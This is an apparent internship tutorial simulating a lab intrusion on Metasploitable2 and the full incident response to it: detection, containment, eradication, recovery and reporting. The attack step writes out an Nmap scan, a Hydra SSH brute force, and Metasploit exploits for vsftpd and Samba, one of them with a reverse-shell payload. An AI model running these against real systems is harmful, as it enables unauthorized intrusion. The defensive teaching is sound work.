# Day 28 — Incident Response Simulation
### ApexPlanet Internship | Task 5: Capstone Project & Incident Response
**Timeline:** Days 49–60 | **Author:** Professorshubhx

---

## What is Incident Response

Incident Response (IR) is the structured process of detecting, analyzing, containing, eradicating, and recovering from a security incident. It is one of the most critical skills for a SOC analyst — when something goes wrong, you need a clear, documented process to follow under pressure.

Today we simulate a complete incident — from detection in logs through to a formal post-incident report. Everything we've built in Tasks 1–5 comes together here.

---

## The IR Framework — PICERL

```
P — Preparation       Having tools, processes, and training in place before incident
I — Identification    Detecting that an incident has occurred
C — Containment       Stopping the spread / limiting damage
E — Eradication       Removing the threat completely
R — Recovery          Restoring systems to normal operation
L — Lessons Learned   Post-incident review and improvement
```

This maps directly to NIST SP 800-61 (Computer Security Incident Handling Guide) — the industry standard.

---

## The Simulated Incident

**Scenario:** The SOC monitoring system (Kibana) has triggered alerts for multiple suspicious activities originating from `192.168.56.101` (Kali Linux — our attacker machine) against `192.168.56.104` (Metasploitable2 — target).

The incident timeline:
```
Phase 1: Attacker performs reconnaissance (Nmap scan)
Phase 2: Attacker brute forces SSH (Hydra)
Phase 3: Attacker exploits vsftpd backdoor (Metasploit)
Phase 4: Attacker performs post-exploitation (system enumeration)
Phase 5: SOC detects, contains, eradicates, recovers
```

---

## Phase 1 — Preparation

Before any incident occurs, a prepared SOC has:

```bash
# Verify SIEM is running and receiving logs
sudo systemctl status elasticsearch kibana logstash filebeat

# Verify log indices exist
curl -s "http://localhost:9200/_cat/indices?v"

# Verify dashboards are accessible
curl -s http://localhost:5601 | head -5

# Have incident response tools ready
which nmap hydra netstat ss iptables tcpdump

# Create IR working directory
mkdir -p ~/incident-response/$(date +%Y%m%d)
cd ~/incident-response/$(date +%Y%m%d)
echo "Incident started: $(date)" > incident-log.txt
```

---

## Phase 2 — Identification (Detection)

### Step 1 — Generate the Incident (Attack Side)

First simulate the attack to generate logs:

```bash
# Attack 1: Nmap reconnaissance
sudo nmap -sV -sC 192.168.56.104 -oX ~/nmap-incident-scan.xml
sudo nmap --script vuln 192.168.56.104 -oN ~/nmap-vuln-scan.txt

# Attack 2: SSH brute force
hydra -l msfadmin \
      -P /usr/share/wordlists/rockyou.txt \
      ssh://192.168.56.104 \
      -t 4 -V -f \
      -o ~/hydra-results.txt &

# Wait 2 minutes for logs to generate
sleep 120

# Attack 3: vsftpd exploitation (Metasploit)
msfconsole -q -x "
use exploit/unix/ftp/vsftpd_234_backdoor;
set RHOSTS 192.168.56.104;
set LHOST 192.168.56.101;
run;
exit
"

# Attack 4: Samba exploitation
msfconsole -q -x "
use exploit/multi/samba/usermap_script;
set RHOSTS 192.168.56.104;
set LHOST 192.168.56.101;
set payload cmd/unix/reverse;
run;
exit
"
```

### Step 2 — Detect in Kibana

Open Kibana and look for these indicators:

```
In Authentication Dashboard:
  - Spike in failed SSH logins from 192.168.56.101
  - High count in "Failed Login Count" metric
  - 192.168.56.101 appears in "Top Brute Force IPs" table

In Web Security Dashboard:
  - attack_type detections in Apache logs

In Security Overview:
  - Large spike in Events Over Time chart
  - Severity "high" slice prominent in pie chart
```

### Step 3 — Detect in Logs (Command Line)

```bash
# Check auth.log for brute force
sudo grep "Failed password" /var/log/auth.log | \
  awk '{print $11}' | sort | uniq -c | sort -rn | head -10

# Output shows:
# 1247 192.168.56.101   ← attacker IP with 1247 failed attempts

# Check for successful login after failures
sudo grep "Accepted" /var/log/auth.log | tail -20

# Check for FTP connections (vsftpd exploit)
sudo grep "vsftpd\|ftp" /var/log/syslog | tail -20

# Check currently established connections
ss -tnp state established

# Check for unusual processes (reverse shell)
ps aux | grep -E "bash|nc|ncat|netcat|python" | grep -v grep

# Check for unusual network connections
netstat -tuln
ss -tuln
```

### Step 4 — Elasticsearch Query for Incident Timeline

```bash
# Get all events from attacker IP in last hour
curl -s -X GET "http://localhost:9200/logs-*/_search?pretty" \
  -H 'Content-Type: application/json' \
  -d '{
    "query": {
      "bool": {
        "must": [
          {"match": {"src_ip": "192.168.56.101"}},
          {"range": {"@timestamp": {"gte": "now-1h"}}}
        ]
      }
    },
    "sort": [{"@timestamp": {"order": "asc"}}],
    "size": 100
  }'

# Count failed logins in last hour
curl -s -X GET "http://localhost:9200/logs-auth-*/_count?pretty" \
  -H 'Content-Type: application/json' \
  -d '{
    "query": {
      "bool": {
        "must": [
          {"match": {"event_type": "ssh_failed_login"}},
          {"range": {"@timestamp": {"gte": "now-1h"}}}
        ]
      }
    }
  }'
```

### Incident Classification

Based on detection findings:

```
Incident Type:    Unauthorized Access / Active Intrusion
Severity:         CRITICAL
Attacker IP:      192.168.56.101
Target IP:        192.168.56.104
Attack Methods:   SSH Brute Force, vsftpd RCE, Samba RCE
Evidence:         auth.log, Metasploit session logs
Initial Alert:    Kibana SSH brute force threshold exceeded
```

---

## Phase 3 — Containment

Containment stops the attack from spreading further without destroying evidence.

### Immediate Containment — Block Attacker IP

```bash
# Block all traffic from attacker IP
sudo iptables -I INPUT 1 -s 192.168.56.101 -j DROP
sudo iptables -I OUTPUT 1 -d 192.168.56.101 -j DROP

# Verify block is in place
sudo iptables -L -n | head -20

# Test — ping should now fail
ping -c 2 192.168.56.101
```

### Kill Active Sessions

```bash
# Find active sessions from attacker
ss -tnp | grep 192.168.56.101

# Kill established connections
sudo tcpkill -i eth0 host 192.168.56.101 2>/dev/null &

# Kill any reverse shells
ps aux | grep "bash -i\|nc " | awk '{print $2}' | xargs sudo kill -9

# Check port 6200 (vsftpd backdoor)
sudo fuser -k 6200/tcp

# Restart vsftpd to close backdoor connection
sudo service vsftpd restart
```

### Isolate if Needed

```bash
# In a real environment — isolate the compromised machine
# In our lab — we can simulate by blocking all traffic except SSH from trusted IP

sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT DROP
sudo iptables -A INPUT -s 192.168.56.1 -j ACCEPT   # Only allow from gateway
sudo iptables -A OUTPUT -d 192.168.56.1 -j ACCEPT
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A OUTPUT -o lo -j ACCEPT
```

### Preserve Evidence

```bash
# Save current log state before anything changes
sudo cp /var/log/auth.log ~/incident-response/$(date +%Y%m%d)/auth.log.evidence
sudo cp /var/log/syslog ~/incident-response/$(date +%Y%m%d)/syslog.evidence

# Hash the evidence files
sha256sum ~/incident-response/$(date +%Y%m%d)/auth.log.evidence
sha256sum ~/incident-response/$(date +%Y%m%d)/syslog.evidence

# Save current network state
ss -tuln > ~/incident-response/$(date +%Y%m%d)/network-state.txt
ps aux > ~/incident-response/$(date +%Y%m%d)/process-state.txt
```

---

## Phase 4 — Eradication

Remove all traces of the attacker from the compromised system.

### Check for Persistence Mechanisms

```bash
# Check crontabs for backdoors
crontab -l
sudo crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# Check for new user accounts created during incident
awk -F: '($3 >= 1000) {print $1, $3}' /etc/passwd
# Compare against known users list

# Check for modified system files
find /etc /bin /usr/bin -mtime -1 2>/dev/null
# Files modified in last 24 hours — suspicious if unexpected

# Check authorized_keys for backdoor SSH keys
cat /root/.ssh/authorized_keys
cat /home/*/.ssh/authorized_keys 2>/dev/null

# Check for SUID files added by attacker
find / -perm -4000 -type f 2>/dev/null

# Check running services for unexpected ones
systemctl list-units --type=service --state=running
```

### Remove Backdoors and Vulnerabilities

```bash
# Upgrade/remove vsftpd 2.3.4 (backdoored version)
sudo apt remove vsftpd -y
# Or upgrade:
sudo apt install vsftpd -y    # Gets latest version

# Disable Telnet
sudo update-rc.d telnet disable
sudo service telnet stop

# Close port 1524 bindshell (Metasploitable specific)
sudo fuser -k 1524/tcp

# Update Samba
sudo apt install samba -y

# Apply all system updates
sudo apt update && sudo apt upgrade -y
```

### Reset Compromised Credentials

```bash
# Change passwords for accounts that may have been compromised
sudo passwd msfadmin
sudo passwd root

# Invalidate all active sessions
sudo pkill -KILL -u msfadmin    # Kill all msfadmin processes
```

---

## Phase 5 — Recovery

Restore systems to normal operation and verify they are clean.

```bash
# Remove containment firewall rules (after eradication is complete)
sudo iptables -F
sudo iptables -P INPUT ACCEPT
sudo iptables -P OUTPUT ACCEPT

# Apply proper hardening rules (from Day 23)
sudo iptables -P INPUT DROP
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# Verify services are running correctly
sudo systemctl status ssh
sudo systemctl status apache2

# Run a clean Nmap scan to verify attack surface reduced
sudo nmap -sS 192.168.56.104

# Compare open ports before and after
# Before: 26 open ports
# After:  Should be significantly fewer

# Verify SIEM is still collecting logs
curl -s "http://localhost:9200/_cat/indices?v"
```

---

## Phase 6 — Lessons Learned

After every incident, document what happened, what went wrong, and how to improve.

### Key Questions to Answer

```
1. How did the attacker get in?
   vsftpd 2.3.4 backdoor — known vulnerability from 2011 — unpatched

2. How long was the attacker present?
   Timeline shows first connection at [timestamp] — X minutes

3. What did the attacker do?
   Reconnaissance, credential brute force, RCE, system enumeration

4. What data was accessed?
   /etc/passwd, /etc/shadow, system information

5. How was it detected?
   SIEM alert — SSH brute force threshold exceeded

6. What could have prevented this?
   Patching vsftpd, firewall blocking port 21 externally,
   fail2ban blocking Hydra, IDS rules

7. How can detection improve?
   Lower alert threshold, add alert for vsftpd connections,
   monitor port 6200 for connections
```

---

## Writing the Post-Incident Report

```
POST-INCIDENT REPORT STRUCTURE:

1. Executive Summary          1 paragraph — what happened, impact, resolved
2. Incident Timeline          Chronological events with timestamps
3. Detection Method           How was it found? Which alert/log?
4. Technical Analysis         Detailed attack description, tools used
5. Impact Assessment          What was accessed/compromised
6. Containment Actions        What was done to stop the attack
7. Eradication Steps          How the threat was removed
8. Recovery Actions           How systems were restored
9. Root Cause Analysis        Why did this happen?
10. Recommendations           What to implement to prevent recurrence
11. Appendices                Log excerpts, screenshots, evidence hashes
```

---

## Kibana Incident Timeline Visualization

Create a timeline of the incident in Kibana:

```
1. Go to Kibana → Discover
2. Index: logs-*
3. Time range: Set to when attack occurred
4. Filter: src_ip: "192.168.56.101"
5. Add columns:
   @timestamp
   event_type
   src_ip
   log_message
   severity
6. Sort by @timestamp ascending
7. Export as CSV for the report
```

---

## Practice Tasks

1. Start the attack simulation — run Nmap, Hydra, and Metasploit exploits
2. Open Kibana dashboard — identify which alert triggers first
3. Run `grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c` — document attacker IP and count
4. Block attacker IP with iptables: `sudo iptables -I INPUT 1 -s 192.168.56.101 -j DROP`
5. Kill any active reverse shell sessions
6. Save evidence: copy auth.log and hash it with sha256sum
7. Check for persistence — crontab, authorized_keys, new users
8. Remove vsftpd: `sudo apt remove vsftpd -y` — verify port 21 closes
9. Run post-eradication Nmap scan — compare open ports before and after
10. Write a 5-sentence executive summary of the simulated incident

---

## Quick Reference

```
IR PHASES (PICERL)              CONTAINMENT COMMANDS
Preparation    Tools ready      iptables -I INPUT 1 -s IP -j DROP
Identification Detect attack    fuser -k 6200/tcp
Containment    Stop spread      pkill -KILL -u username
Eradication    Remove threat    service vsftpd stop
Recovery       Restore normal   iptables -F (remove blocks)
Lessons        Improve          apt remove vsftpd -y

DETECTION COMMANDS              EVIDENCE PRESERVATION
grep "Failed password" auth.log cp auth.log auth.log.evidence
ss -tnp state established       sha256sum auth.log.evidence
ps aux | grep bash              ps aux > process-state.txt
netstat -tuln                   ss -tuln > network-state.txt

ERADICATION CHECKS
crontab -l                      cat ~/.ssh/authorized_keys
find /etc -mtime -1             awk -F: '$3>=1000' /etc/passwd
find / -perm -4000              systemctl list-units --running
```

---

## Resources

- NIST SP 800-61: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf
- SANS Incident Handler's Handbook: https://www.sans.org/reading-room/whitepapers/incident/incident-handlers-handbook-33901
- MITRE ATT&CK for IR: https://attack.mitre.org/
- Defronix Academy | Mentor: Nitesh Singh Sir

---

## Connect

- **LinkedIn:** [Shubham Chaurasiya](https://www.linkedin.com/in/shubham-chaurasiya-60932a359/)
- **TryHackMe:** [professorshubhx](https://tryhackme.com/p/professorshubhx)

---

*Day 28 Complete | Next: Day 29 — Final Documentation and Capstone Report*
